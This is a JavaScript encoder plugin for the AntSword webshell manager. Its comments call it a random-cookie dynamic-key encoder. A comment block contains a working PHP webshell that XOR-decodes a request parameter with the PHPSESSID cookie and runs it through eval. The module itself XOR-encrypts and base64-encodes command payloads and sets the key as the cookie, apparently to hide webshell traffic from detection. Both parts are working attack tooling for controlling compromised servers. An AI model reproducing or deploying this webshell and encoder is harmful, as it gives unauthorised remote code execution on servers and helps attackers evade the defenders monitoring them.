'use strict';
//基于随机Cookie的蚁剑动态秘钥编码器
//link:https://yzddmr6.tk/posts/antsword-xor-encoder-2/
//code by yzddmr6
/* 服务端
<?php
@$post=base64_decode($_REQUEST['yzddmr6']);
$key=@$_COOKIE['PHPSESSID'];
for($i=0;$i<strlen($post);$i++){
    $post[$i] = $post[$i] ^ $key[$i%26];
}
@eval($post);
?>
*/
module.exports = (pwd, data, ext = {}) => {
  let randomID = `x${Math.random().toString(16).substr(2)}`;

  function xor(payload) {
    let crypto = require('crypto');
    let key = crypto.createHash('md5').update(randomID).digest('hex').substr(6);
    ext.opts.httpConf.headers['Cookie'] = 'PHPSESSID=' + key;
    key = key.split("").map(t => t.charCodeAt(0));
    //let payload="phpinfo();";
    let cipher = payload.split("").map(t => t.charCodeAt(0));
    for (let i = 0; i < cipher.length; i++) {
      cipher[i] = cipher[i] ^ key[i % 26]
    }
    cipher = cipher.map(t => String.fromCharCode(t)).join("")
    cipher = Buffer.from(cipher).toString('base64');
    //console.log(cipher)
    return cipher;
  }


  data['_'] = Buffer.from(data['_']).toString('base64');
  data[pwd] = `eval(base64_decode("${data['_']}"));`;
  data[pwd]=xor(data[pwd]);
  delete data['_'];

  return data;
}